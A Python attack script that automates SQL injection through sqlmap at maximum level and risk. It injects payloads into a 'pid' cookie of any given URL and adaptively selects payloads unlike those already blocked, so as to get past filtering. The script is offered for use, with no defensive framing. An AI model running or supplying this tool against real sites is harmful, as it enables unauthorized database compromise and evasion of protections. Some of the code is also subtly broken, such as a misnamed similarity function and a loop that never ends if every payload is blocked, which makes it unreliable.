import numpy as np
import requests
from urllib3.util.retry import Retry
from requests.adapters import HTTPAdapter
import concurrent.futures
import math
import argparse
import os
import subprocess
import json
import tempfile

class SQLITester:
    def __init__(self, target_url, cookie_name="pid"):
        self.target_url = target_url
        self.cookie_name = cookie_name
        self.session = self._setup_session()
        
    def _setup_session(self):
        session = requests.Session()
        retries = Retry(
            total=25,
            backoff_factor=0.5,
            status_forcelist=[500, 502, 503, 504]
        )
        session.mount('http://', HTTPAdapter(max_retries=retries))
        session.mount('https://', HTTPAdapter(max_retries=retries))
        return session

    def test_payload(self, payload):
        with tempfile.NamedTemporaryFile(mode='w+', suffix='.txt') as tmp_file:
            sqlmap_cmd = [
                'sqlmap',
                '-u', self.target_url,
                '--cookie', f"{self.cookie_name}={payload}",
                '--batch',
                '--random-agent',
                '--level', '5',
                '--risk', '3',
                '--threads', '4',
                '--output-dir', '/tmp/sqlmap_results',
                '--fresh-queries'
            ]
            
            try:
                process = subprocess.run(
                    sqlmap_cmd,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    text=True,
                    timeout=300
                )
                
                output = process.stdout.lower() if process.stdout else ""
                if any(sign in output for sign in [
                    'parameter is vulnerable',
                    'the back-end dbms is',
                    'sqlmap identified'
                ]):
                    print(f"[+] Payload berhasil: {payload}")
                    return True
                return False
                
            except subprocess.TimeoutExpired:
                print(f"[-] Timeout testing payload: {payload}")
                return False
            except Exception as e:
                print(f"[-] Error testing payload: {str(e)}")
                return False

    def run_test_campaign(self, features_file, dataset_file, output_file, num_tests=100):
        try:
            features = np.load(features_file)
            dataset = np.load(dataset_file)
        except Exception as e:
            print(f"Error loading files: {str(e)}")
            return []

        results = []
        os.makedirs('/tmp/sqlmap_results', exist_ok=True)

        for test_num in range(num_tests):
            print(f"\n[*] Running test {test_num + 1}/{num_tests}")
            blocked_count = self._run_single_test(features.copy(), dataset.copy())
            results.append(blocked_count)
            np.save(output_file, np.array(results))
            print(f"[+] Test {test_num + 1} complete: {blocked_count} payloads blocked")

        return results

    def _run_single_test(self, features, dataset, k=10):
        blocked = []
        current_features = features.copy()
        current_dataset = dataset.copy()
        
        while True:
            candidates = self._select_candidates(current_dataset, current_features, k)
            test_payload = self._select_best_payload(candidates, blocked)
            
            if self.test_payload(test_payload['payload']):
                return len(blocked)
            
            blocked.append(test_payload['features'])
            
        return len(blocked)

    def _select_candidates(self, dataset, features, k):
        indices = np.random.choice(len(dataset), k, replace=False)
        return [{'payload': dataset[i], 'features': features[i]} for i in indices]

    def _select_best_payload(self, candidates, blocked):
        if not blocked:
            return np.random.choice(candidates)
            
        max_distance = -1
        best_candidate = None
        
        for candidate in candidates:
            min_dist = min(self._cosine_similarity(candidate['features'], b) for b in blocked)
            if min_dist > max_distance:
                max_distance = min_dist
                best_candidate = candidate
                
        return best_candidate

    def _cosine_similarity(self, v1, v2):
        dot_product = np.dot(v1, v2)
        if dot_product == 0:
            return float('inf')
        return 1 / dot_product

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Testing Automation')
    parser.add_argument('--url', required=True, help='Target URL')
    parser.add_argument('--features', required=True, help='Path to features.npy file')
    parser.add_argument('--dataset', required=True, help='Path to dataset.npy file')
    parser.add_argument('--output', required=True, help='Output file path')
    parser.add_argument('--tests', type=int, default=100, help='Number of tests to run')
    
    args = parser.parse_args()
    
    tester = SQLITester(args.url)
    results = tester.run_test_campaign(
        args.features,
        args.dataset,
        args.output,
        args.tests
    )
    
    print(f"\nTesting complete. Results saved to {args.output}")
    if results:
        print(f"Average blocked payloads: {np.mean(results):.2f}")
    else:
        print("No results were generated. Please check the error messages above.")

if __name__ == "__main__":
    main()
